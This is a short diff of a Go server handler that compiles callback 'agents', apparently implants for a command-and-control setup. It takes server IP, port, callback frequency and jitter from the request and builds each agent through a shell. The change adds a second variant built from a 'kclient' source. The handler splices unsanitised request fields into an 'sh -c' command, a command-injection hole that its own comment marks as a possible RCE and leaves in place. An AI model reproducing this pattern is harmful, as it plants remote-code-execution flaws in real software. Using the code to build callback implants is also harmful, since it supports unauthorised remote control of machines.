@@ -93,17 +93,30 @@ func main() {
 		req.BindBody(&body)
 		tag := strings.Split(newPayID, "-")
 		concat := body["name"] + "_" + tag[0]
-
+		var commandString string
+		fmt.Println(body)
 		// Possible RCE concern
-		commandString := fmt.Sprintf( // Borrowed from https://github.com/s-christian/pwnts/blob/master/site/site.go#L175
+		if body["type"] == "original" {
+			commandString = fmt.Sprintf( // Borrowed from https://github.com/s-christian/pwnts/blob/master/site/site.go#L175
 
-			"CGO_ENABLED=0 go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s\" -o agents/%s client/client.go",
-			body["serverip"],
-			body["serverport"],
-			body["callbackfrequency"],
-			body["callbackjitter"],
-			concat,
-		)
+				"CGO_ENABLED=0 go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s\" -o agents/%s client/client.go",
+				body["serverip"],
+				body["serverport"],
+				body["callbackfrequency"],
+				body["callbackjitter"],
+				concat,
+			)
+		} else if body["type"] == "wkeys" {
+			commandString = fmt.Sprintf( // Borrowed from https://github.com/s-christian/pwnts/blob/master/site/site.go#L175
+
+				"CGO_ENABLED=0 go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s\" -o agents/%s client/kclient/kclient.go",
+				body["serverip"],
+				body["serverport"],
+				body["callbackfrequency"],
+				body["callbackjitter"],
+				concat,
+			)
+		}
 
 		err = exec.Command("sh", "-c", commandString).Run()
 		if err != nil {
